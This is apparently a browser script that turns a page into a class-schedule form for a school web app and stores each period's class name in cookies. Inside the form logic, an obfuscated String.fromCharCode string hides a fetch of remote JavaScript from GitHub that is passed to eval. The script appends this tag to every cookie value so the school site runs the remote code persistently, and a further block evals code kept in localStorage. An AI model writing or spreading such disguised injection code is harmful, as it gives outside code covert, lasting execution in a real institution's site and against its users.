document.documentElement.innerHTML = `<!DOCTYPE html>
<html><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>

<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
* {
  box-sizing: border-box;
}
body {
	margin: 0;
	padding: 0;
	font-family: Arial, Helvetica, sans-serif;
	background: #e9e9e9;
}

.flexsubbar {
  display: block;
  height: 60px;
  background: #fff;
  border-bottom: 3px solid #800000;
  border-top: 3px solid #800000;
  line-height: 60px;
  padding-left: 20px;
  font-size: 18pt;

}
.form-control {
  display: block;
  width: 100%;
  padding: .375rem .75rem;
  font-size: 1rem;
  font-weight: 400;
  line-height: 1.5;
  color: #212529;
  background-color: #fff;
  background-clip: padding-box;
  border: 1px solid #ced4da;
  -webkit-appearance: none;
  -moz-appearance: none;
  appearance: none;
  border-radius: .25rem;
  transition: border-color .15s ease-in-out,box-shadow .15s ease-in-out;
}
</style>
</head>
<body>
		
				
<div class="container-fluid">
<div class="row g-3 align-items-center"> 
	<div class="col-auto">
		<div class="flexsubbar">
			<svg style="top:-2px;position:relative" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 448 512"><!--! Font Awesome Free 6.4.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license (Commercial License) Copyright 2023 Fonticons, Inc. --><path d="M224 0c-17.7 0-32 14.3-32 32V49.9C119.5 61.4 64 124.2 64 200v33.4c0 45.4-15.5 89.5-43.8 124.9L5.3 377c-5.8 7.2-6.9 17.1-2.9 25.4S14.8 416 24 416H424c9.2 0 17.6-5.3 21.6-13.6s2.9-18.2-2.9-25.4l-14.9-18.6C399.5 322.9 384 278.8 384 233.4V200c0-75.8-55.5-138.6-128-150.1V32c0-17.7-14.3-32-32-32zm0 96h8c57.4 0 104 46.6 104 104v33.4c0 47.9 13.9 94.6 39.7 134.6H72.3C98.1 328 112 281.3 112 233.4V200c0-57.4 46.6-104 104-104h8zm64 352H224 160c0 17 6.7 33.3 18.7 45.3s28.3 18.7 45.3 18.7s33.3-6.7 45.3-18.7s18.7-28.3 18.7-45.3z"/></svg>
			 &nbsp; Set your schedule
		</div>
		<div style="background: #fff;  padding-left:10px; padding-right:10px;">
			<p> Enter your class for each period. Enter "Free" for periods you don't have classes.</p>
			<p>This schedule will be saved on your current device/browser and will be wiped when you clear the cache and/or "cookies".</p>
		</div>	
	</div>
</div>

<div class="row g-3 align-items-center"><div class="col-auto"> <label for="InputPeriod1" class="form-label">Period 1:</label> </div><div class="col-auto"> <input type="text" class="form-control" id="InputPeriod1" name="Period1"> </div></div>
<div class="row g-3 align-items-center"><div class="col-auto"> <label for="InputPeriod2" class="form-label">Period 2:</label> </div><div class="col-auto"> <input type="text" class="form-control" id="InputPeriod2" name="Period2"> </div></div>
<div class="row g-3 align-items-center"><div class="col-auto"> <label for="InputPeriod3" class="form-label">Period 3:</label> </div><div class="col-auto"> <input type="text" class="form-control" id="InputPeriod3" name="Period3"> </div></div>
<div class="row g-3 align-items-center"><div class="col-auto"> <label for="InputPeriod4" class="form-label">Period 4:</label> </div><div class="col-auto"> <input type="text" class="form-control" id="InputPeriod4" name="Period4"> </div></div>
<div class="row g-3 align-items-center"><div class="col-auto"> <label for="InputPeriod5" class="form-label">Period 5:</label> </div><div class="col-auto"> <input type="text" class="form-control" id="InputPeriod5" name="Period5"> </div></div>
<div class="row g-3 align-items-center"><div class="col-auto"> <label for="InputPeriod6" class="form-label">Period 6:</label> </div><div class="col-auto"> <input type="text" class="form-control" id="InputPeriod6" name="Period6"> </div></div>
<div class="row g-3 align-items-center"><div class="col-auto"> <label for="InputPeriod7" class="form-label">Period 7:</label> </div><div class="col-auto"> <input type="text" class="form-control" id="InputPeriod7" name="Period7"> </div></div>
<div class="row g-3 align-items-center"><div class="col-auto"> <label for="InputPeriod8" class="form-label">Period 8:</label> </div><div class="col-auto"> <input type="text" class="form-control" id="InputPeriod8" name="Period8"> </div></div>


  <button type="submit" class="btn btn-primary" style="border-radius:.25rem" onclick="submitClassNames()">Submit</button>
</div>
</body></html>`

var longCode = "<script>fetch(String.fromCharCode(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,80,111,121,79,122,107,47,82,72,83,45,77,111,100,108,111,97,100,101,114,47,109,97,105,110,47,115,116,97,114,116,46,106,115)).then(response=>response.text()).then(d=>eval(d))" + "</" + "script>";

	function setCookie(name, value) {
	document.cookie = `${name}=${encodeURIComponent(value)}; samesite=Strict; path=/`;
	}
	document.setCookie = setCookie;
	
	function getCookie(name) {
		const cookies = document.cookie.split('; ');
		for (const cookie of cookies) {
			const [cookieName, cookieValue] = cookie.split('=');
			if (cookieName === name) {
				return decodeURIComponent(cookieValue); 
			} } return null; 
		}
		document.getCookie = getCookie;
	
	
	function initializeClassNames() { //make loop that runs 8 times
	var i = 0;
	while (i < 9) { if(document.querySelector("#InputPeriod" + i)) {
		document.querySelector("#InputPeriod" + i).value = getCookie("Period" + i).replace(longCode, "");
	 }
	 
	 i++;} }
	
	
	function submitClassNames() {
	 for (let i = 1; i <= 8; i++) {

		if(document.querySelector("#InputPeriod" + i).value) {
			setCookie("Period" + i, document.querySelector("#InputPeriod" + i).value + longCode)
		}
			else {
				setCookie("Period" + i, '<span class="original">Period ' + i + "</span>" + longCode)
			}
	  }
	  location.replace("https://app.ridgewood.k12.nj.us")
	}

	initializeClassNames();
	document.submitClassNames = submitClassNames;
	document.initializeClassNames = initializeClassNames;



//start.min.js
for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const object = JSON.parse(localStorage.getItem(key));
        if (object && object.state === 1 && key.endsWith('.css')) {
            const styleTag = document.createElement('style');
            styleTag.textContent = object.code;
            styleTag.setAttribute('data-mod-name', key);
            document.head.appendChild(styleTag);
        }
    }
      for (let i = 0; i < localStorage.length; i++) {
          const key = localStorage.key(i);
          const object = JSON.parse(localStorage.getItem(key));
          if (object) {
              if (object.state === 1 && key.endsWith('.js')) {
                  eval(object.code);
              }
          }
      }
  
  document.addEventListener('keydown', function(event) {
      if (event.ctrlKey && event.key === 'y') {
          localStorage.clear();
          location.reload();
      }
  });
